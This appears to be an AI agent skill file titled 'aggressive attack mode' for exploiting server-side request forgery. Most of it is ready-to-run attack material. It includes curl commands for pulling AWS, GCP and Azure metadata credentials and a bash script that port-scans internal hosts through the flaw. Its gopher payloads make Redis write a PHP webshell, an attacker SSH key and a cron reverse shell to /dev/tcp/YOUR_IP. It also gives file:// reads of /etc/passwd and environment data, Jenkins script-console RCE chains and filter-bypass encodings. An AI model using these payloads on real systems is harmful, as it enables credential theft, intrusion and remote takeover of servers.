---
name: hunt-ssrf-advanced
description: Advanced SSRF — Cloud metadata (AWS/GCP/Azure), internal service discovery, DNS rebinding, protocol smuggling (gopher/dict/file), URL parser differentials, SSRF-to-RCE chains, bypass techniques (IPv6/decimal/octal/encoding), blind SSRF detection with OOB. Extends base hunt-ssrf skill with advanced exploitation and evasion.
---

# ADVANCED SSRF HUNTING — AGGRESSIVE ATTACK MODE

**SSRF chains from Low to Critical: DNS callback → internal network → cloud creds → RCE.**

## Quick Start

```bash
# Cloud metadata access
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"

# Protocol smuggling
curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_INFO%0D%0A"

# Blind SSRF detection
curl -s "https://target.com/fetch?url=http://YOUR_OOB_SERVER/callback"
```

## Cloud Metadata Endpoints

### AWS IMDSv1

```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

### AWS IMDSv2 (Requires PUT token)

```bash
# Step 1: Get token (requires SSRF that supports PUT + headers)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/"
```

### GCP Metadata

```bash
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
# Required header: Metadata-Flavor: Google
```

### Azure IMDS

```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
# Required header: Metadata: true
```

## Internal Service Discovery

### Port Scanning via SSRF

```bash
#!/bin/bash
# ssrf-portscan.sh — Scan internal ports through SSRF endpoint
TARGET="https://target.com/fetch?url="
RANGE="127.0.0.1"

for PORT in 21 22 25 80 443 445 993 995 1433 1521 3306 3389 5432 5900 6379 8080 8443 8888 9090 9200 9300 11211 27017 28017 50000; do
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "${TARGET}${RANGE}:${PORT}/" 2>/dev/null)
  if [ "$RESULT" != "000" ] && [ "$RESULT" != "502" ] && [ "$RESULT" != "503" ]; then
    echo "[+] Port $PORT OPEN (HTTP $RESULT)"
  fi
done
```

### Service Fingerprinting

```bash
# Redis (unauthenticated)
curl -s "${TARGET}http://127.0.0.1:6379/" | head -1
# Response: -ERR wrong number of arguments for 'get' command

# Elasticsearch
curl -s "${TARGET}http://127.0.0.1:9200/_cat/indices"
curl -s "${TARGET}http://127.0.0.1:9200/_nodes/settings"

# MongoDB (HTTP interface)
curl -s "${TARGET}http://127.0.0.1:28017/"

# Docker API
curl -s "${TARGET}http://127.0.0.1:2375/containers/json"
curl -s "${TARGET}http://127.0.0.1:2375/info"

# Kubernetes API
curl -s "${TARGET}https://10.96.0.1:443/api/v1/namespaces" -k

# Jenkins
curl -s "${TARGET}http://127.0.0.1:8080/api/json"

# Prometheus
curl -s "${TARGET}http://127.0.0.1:9090/api/v1/targets"

# Consul
curl -s "${TARGET}http://127.0.0.1:8500/v1/catalog/services"

# etcd
curl -s "${TARGET}http://127.0.0.1:2379/v2/keys/"

# Active Directory/LDAP
curl -s "${TARGET}ldap://127.0.0.1:389/"
```

## DNS Rebinding Attacks

DNS rebinding resolves a domain to different IPs on successive lookups — bypassing IP validation.

### Attack Flow

```
1. Register domain evil.com with TTL=0
2. First DNS lookup → 1.2.3.4 (passes SSRF validation)
3. Target app fetches evil.com → DNS rebinding → 127.0.0.1
4. Internal request to localhost via the rebinding domain
```

### Rebinding Services

```bash
# rbndr.us (free rebinding service)
https://rbndr.us/dns?q=127.0.0.1
# Use: https://target.com/fetch?url=https://rbndr.us/dns?q=127.0.0.1

# rbndr with custom IP
# 1. Register with rebinding service
# 2. Use the generated domain in SSRF payload
```

### DIY DNS Rebinding

```bash
# Set up authoritative DNS for evil.com
# Return A record 1.2.3.4, then 127.0.0.1 on next query
# Tools: dogsci123, rebinder, dnsrebinder
```

## Protocol Smuggling

### gopher:// (Redis, MySQL, SMTP, FastCGI)

```bash
# Redis — write webshell
gopher://127.0.0.1:6379/_SET%20shell%20%3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%3F%3E%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

# Redis — write SSH key
gopher://127.0.0.1:6379/_SET%20sshkey%20%0Assh-rsa%20AAAAB3...attacker%20root%40attacker%0A%0D%0ACONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASAVE%0D%0A

# MySQL — read files
gopher://127.0.0.1:3306/_...MySQL protocol...
```

### dict://

```bash
# Redis info
dict://127.0.0.1:6379/INFO

# SMTP banner grab
dict://127.0.0.1:25/
```

### file://

```bash
# Read local files
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
```

### URL-Encoded Protocol Smuggling

```bash
# Encode gopher for URL parameter
gopher://127.0.0.1:6379/_INFO%0D%0A

# Use Python to generate payloads
python3 -c "import urllib.parse; print(urllib.parse.quote('gopher://127.0.0.1:6379/_SET test hacked'))"
```

## URL Parser Differentials

Different parsers handle URLs differently — exploit the gap.

### WHATWG URL vs Library Parsers

```
https://evil.com\@target.com     # WHATWG: target.com, others: evil.com
https://evil.com#@target.com    # WHATWG: fragment, others: domain
https://127.0.0.1\@evil.com      # Library: 127.0.0.1, WHATWG: evil.com
http://127.0.0.1%2523@evil.com   # Double-encoded fragment
```

### Backslash Confusion

```bash
# Python requests / Node.js fetch treat \ differently
https://target.com@127.0.0.1/     # Some: target.com is user, 127.0.0.1 is host
http://127.0.0.1\@evil.com/       # Different parsers → different hosts
```

### IPv6 Bracket Bypass

```bash
http://[::1]/                     # IPv6 loopback
http://[::ffff:127.0.0.1]/       # IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

## SSRF to RCE Chains

### Via Internal Admin Panels

```bash
# Jenkins → Script Console (RCE)
curl -s "${TARGET}http://127.0.0.1:8080/script"
# POST: script=println "id".execute().text

# Prometheus → target discovery
curl -s "${TARGET}http://127.0.0.1:9090/api/v1/targets"

# Grafana → datasource proxy (SSRF pivot)
curl -s "${TARGET}http://127.0.0.1:3000/api/datasources/proxy/1/"

# Argo CD → exec into pods
curl -s "${TARGET}http://127.0.0.1:8080/api/v1/applications/APP_NAME"
```

### Via Redis (gopher)

```bash
# Write cron job for reverse shell
gopher://127.0.0.1:6379/_SET%20x%20%22* * * * * bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261%22%0D%0ACONFIG%20SET%20dir%20/var/spool/cron/crontabs%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASAVE%0D%0A
```

### Via FastCGI

```bash
# gopher://127.0.0.1:9000/_ (FastCGI protocol)
# Execute PHP code via php-fpm
# Use tools: Gopherus, phpggc
```

## Bypass Techniques

### IP Address Obfuscation

| Technique | Example | Resolves To |
|-----------|---------|-------------|
| Decimal IP | `http://2130706433` | 127.0.0.1 |
| Octal IP | `http://0177.0.0.1` | 127.0.0.1 |
| Hex IP | `http://0x7f.0x0.0x0.0x1` | 127.0.0.1 |
| Short IP | `http://127.1` | 127.0.0.1 |
| Mixed notation | `http://0x7f.1` | 127.0.0.1 |
| IPv6 | `http://[::1]` | 127.0.0.1 |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` | 127.0.0.1 |
| IPv6 all-zeros | `http://[0000::0001]` | 127.0.0.1 |
| URL encoding | `http://%31%32%37%2e%30%2e%30%2e%31` | 127.0.0.1 |
| Double encoding | `http://%2531%2532%2537%252e%2530%252e%2530%252e%2531` | 127.0.0.1 |
| Unicode | `http://①②⑦.⓪.⓪.①` | 127.0.0.1 |
| Zero-width chars | `http://127.0.0.1\u200b` | Varies |

### Redirect-Based Bypass

```bash
# Use external redirect to bypass IP validation
curl -s "${TARGET}http://evil.com/redirect-to-internal"
# evil.com redirects to http://127.0.0.1:8080

# Short URL services
curl -s "${TARGET}http://bit.ly/xxxxxx"  # bit.ly redirects to internal
```

### DNS Rebinding Bypass

```bash
# Domain passes validation on first lookup, resolves to internal on second
curl -s "${TARGET}https://rebinder-domain.com/internal-endpoint"
```

## Blind SSRF Detection

### Webhook Callbacks

```bash
# Use requestbin, webhook.site, or custom server
curl -s "https://target.com/fetch?url=http://YOUR_WEBHOOK/callback"

# Check webhook for incoming request (proves SSRF)
```

### OOB (Out-of-Band) Techniques

```bash
# Collaborator-style detection
curl -s "https://target.com/fetch?url=http://UNIQUE-ID.xxxx.oast.fun"

# DNS-based detection
curl -s "https://target.com/fetch?url=http://UNIQUE-ID.xxxx.oast.fun"
# Check DNS logs for query from target IP

# Custom OOB server
python3 -c "
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[+] OOB Hit: {self.path}')
        self.send_response(200)
        self.end_headers()
socketserver.TCPServer(('', 8888), H).serve_forever()
"
```

### Timing-Based Detection

```bash
# Compare response times for open vs closed ports
time curl -s "${TARGET}http://127.0.0.1:22/" -o /dev/null
time curl -s "${TARGET}http://127.0.0.1:9999/" -o /dev/null
# Significant time difference = port open
```

## Checklist

- [ ] Test cloud metadata endpoints (AWS/GCP/Azure)
- [ ] Attempt IMDSv2 PUT token retrieval
- [ ] Port scan internal network via SSRF
- [ ] Fingerprint discovered services
- [ ] Test gopher:// protocol for Redis/MySQL/SMTP
- [ ] Test file:// for local file read
- [ ] Test URL parser differentials (backslash, IPv6, encoding)
- [ ] Test DNS rebinding (rbndr.us or custom)
- [ ] Chain SSRF → internal admin panels → RCE
- [ ] Set up OOB listener for blind SSRF detection
- [ ] Test redirect-based bypass
- [ ] Test all IP obfuscation techniques

## Tools

- **Gopherus** — Generate gopher payloads for Redis, MySQL, FastCGI
- **SSRFmap** — Automate SSRF exploitation
- **Interactsh** — OOB interaction server
- **Burp Collaborator** — Blind SSRF detection
- **curl** — Manual testing
- **custom port scanner** — See bash script above
